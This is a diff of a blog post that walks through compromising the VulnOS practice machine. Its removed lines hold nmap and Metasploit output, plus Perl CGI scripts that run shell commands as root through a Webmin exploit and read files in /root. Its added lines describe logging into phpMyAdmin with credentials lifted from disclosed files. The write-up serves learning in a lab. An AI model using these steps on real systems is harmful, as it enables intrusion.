@@ -118,80 +118,8 @@ Let&rsquo;s do some fingerprinting.</p>
 
 <h4>Fingerprinting</h4>
 
-<p>I still used <a href="http://nmap.org/">nmap</a> to do this :</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>./nmap 192.168.56.105 -sV
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-08 21:29 CEST
-</span><span class='line'>Nmap scan report for 192.168.56.105
-</span><span class='line'>Host is up (0.0012s latency).
-</span><span class='line'>Not shown: 977 closed ports
-</span><span class='line'>PORT      STATE SERVICE     VERSION
-</span><span class='line'>22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
-</span><span class='line'>23/tcp    open  telnet      Linux telnetd
-</span><span class='line'>25/tcp    open  smtp        Postfix smtpd
-</span><span class='line'>53/tcp    open  domain      ISC BIND 9.7.0-P1
-</span><span class='line'>80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))
-</span><span class='line'>110/tcp   open  pop3        Dovecot pop3d
-</span><span class='line'>111/tcp   open  rpcbind     2 (RPC #100000)
-</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>143/tcp   open  imap        Dovecot imapd
-</span><span class='line'>389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
-</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>512/tcp   open  exec        netkit-rsh rexecd
-</span><span class='line'>513/tcp   open  login
-</span><span class='line'>514/tcp   open  shell?
-</span><span class='line'>901/tcp   open  http        Samba SWAT administration server
-</span><span class='line'>993/tcp   open  ssl/imap    Dovecot imapd
-</span><span class='line'>995/tcp   open  ssl/pop3    Dovecot pop3d
-</span><span class='line'>2000/tcp  open  sieve       Dovecot timsieved
-</span><span class='line'>2049/tcp  open  nfs         2-4 (RPC #100003)
-</span><span class='line'>3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1
-</span><span class='line'>6667/tcp  open  irc         IRCnet ircd
-</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
-</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
-</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
-</span><span class='line'>SF-Port514-TCP:V=6.41SVN%I=7%D=4/8%Time=53444E0C%P=x86_64-unknown-linux-gn
-</span><span class='line'>SF:u%r(NULL,33,"\x01getnameinfo:\x20Temporary\x20failure\x20in\x20name\x20
-</span><span class='line'>SF:resolution\n");
-</span><span class='line'>Service Info: Hosts:  VulnOS.home, irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></code></pre></td></tr></table></div></figure>
-
+<p>I still used <a href="http://nmap.org/">nmap</a> to do this :
+<img src="/images/vulnos/nmap_scan.png" /></p>
 
 <p>Port 80 and 8080 are open. I used <a href="https://www.cirt.net/Nikto2">nikto</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a> to do even more fingerprinting.</p>
 
@@ -452,23 +380,7 @@ I did lot of attempts to exploit MySQL, the IRC daemon, SMTP, .. but it didn&rsq
 <p>To do so, I started to use Metasploit to see if there was relevant exploit.
 And there was one :</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>   Name                                         Disclosure Date          Rank       Description
-</span><span class='line'>   ----                                         ---------------          ----       -----------
-</span><span class='line'>   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06 00:00:00 UTC  normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
-</span><span class='line'>   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06 00:00:00 UTC  normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
-</span><span class='line'>   auxiliary/admin/webmin/file_disclosure       2006-06-30 00:00:00 UTC  normal     Webmin File Disclosure
-</span><span class='line'>   auxiliary/admin/webmin/file_disclosure       2006-06-30 00:00:00 UTC  normal     Webmin File Disclosure
-</span><span class='line'>   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06 00:00:00 UTC  excellent  Webmin /file/show.cgi Remote Command Execution
-</span><span class='line'>   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06 00:00:00 UTC  excellent  Webmin /file/show.cgi Remote Command Execution</span></code></pre></td></tr></table></div></figure>
-
+<p><img src="/images/vulnos/metasploit_webmin_exploit.png" /></p>
 
 <p>I decided to use <em>auxiliary/admin/webmin/file_disclosure</em>.</p>
 
@@ -568,6 +480,15 @@ And there was one :</p>
 So, I decided to get Apache&rsquo;s access logs.
 Thanks to this, I&rsquo;ve been able to detect even more Web applications: MediaWiki, dolibarr-3.0.0, egroupware, And DVWA (Damn Vulnerable Web App)&hellip;</p>
 
+<p>I also had access to all the files I wanted, so I gathered credentials for the database.
+It was then possible to login through the phpmyadmin pannel using: <strong>webmin</strong>/<strong>webmin</strong>.</p>
+
+<p><img src="/images/vulnos/phpmyadmin_wikiuser.png" /></p>
+
+<p>And here is the output of the table <strong>user</strong> in <strong>Mysql</strong> database.</p>
+
+<p><img src="/images/vulnos/mysql_users.png" /></p>
+
 <h4>Access maintenance</h4>
 
 <p>I decided to check Damn Vulnerable Web App at the address : <a href="http://192.168.56.105/DVWA-1.0.8/">http://192.168.56.105/DVWA-1.0.8/</a>
@@ -597,97 +518,11 @@ It&rsquo;s time to get a reverse shell !</p>
 
 <p>Then, Thanks to D4rk, I created a cgi script in DVWA&rsquo;s folder:</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/perl -w
-</span><span class='line'>print "Content-type: text/html\n\n";
-</span><span class='line'>exec "id && ifconfig -a && ls -lah /root/";</span></code></pre></td></tr></table></div></figure>
-
+<p><img src="/images/vulnos/script_cgi.png" /></p>
 
 <p>Using Webmin&rsquo;s exploit, just change <em>RPATH</em> to the new file and <strong>exploit</strong>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>uid=0(root) gid=0(root)
-</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 08:00:27:43:06:19  
-</span><span class='line'>          inet addr:192.168.56.105  Bcast:192.168.56.255  Mask:255.255.255.0
-</span><span class='line'>          inet6 addr: fe80::a00:27ff:fe43:619/64 Scope:Link
-</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-</span><span class='line'>          RX packets:682373 errors:0 dropped:0 overruns:0 frame:0
-</span><span class='line'>          TX packets:620619 errors:0 dropped:0 overruns:0 carrier:0
-</span><span class='line'>          collisions:0 txqueuelen:1000 
-</span><span class='line'>          RX bytes:216548038 (216.5 MB)  TX bytes:146228386 (146.2 MB)
-</span><span class='line'>
-</span><span class='line'>lo        Link encap:Local Loopback  
-</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
-</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
-</span><span class='line'>          UP LOOPBACK RUNNING  MTU:16436  Metric:1
-</span><span class='line'>          RX packets:2154 errors:0 dropped:0 overruns:0 frame:0
-</span><span class='line'>          TX packets:2154 errors:0 dropped:0 overruns:0 carrier:0
-</span><span class='line'>          collisions:0 txqueuelen:0 
-</span><span class='line'>          RX bytes:362585 (362.5 KB)  TX bytes:362585 (362.5 KB)
-</span><span class='line'>
-</span><span class='line'>total 28K
-</span><span class='line'>drwx------  4 root root 4.0K Mar 19 18:12 .
-</span><span class='line'>drwxr-xr-x 24 root root 4.0K Mar 30 01:34 ..
-</span><span class='line'>drwx------  2 root root 4.0K Mar  8 20:43 .aptitude
-</span><span class='line'>-rw-r--r--  1 root root 3.1K Apr 23  2010 .bashrc
-</span><span class='line'>drwxr-xr-x  2 root root 4.0K Mar  8 20:43 .debtags
-</span><span class='line'>-rw-r--r--  1 root root  140 Apr 23  2010 .profile
-</span><span class='line'>-rw-r--r--  1 root root  118 Mar 19 18:11 hello.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And the last flag :</p>
-
-<p>Then, update your <em>cgi</em> script and <strong>cat</strong> hello.txt :</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/perl -w
-</span><span class='line'>print "Content-type: text/html\n\n";
-</span><span class='line'>exec "cat /root/hello.txt";</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Hello,
-</span><span class='line'>
-</span><span class='line'>So you got root... You still need to find the rest of the vulnerabilities inside the OS !
-</span><span class='line'>
-</span><span class='line'>TRY HARDER !!!!!!!</span></code></pre></td></tr></table></div></figure>
-
+<p><img src="/images/vulnos/webmin_root_script_result.png" /></p>
 
 <p>Hope you liked it and that you learnt something. :&ndash;)</p>
 </div>
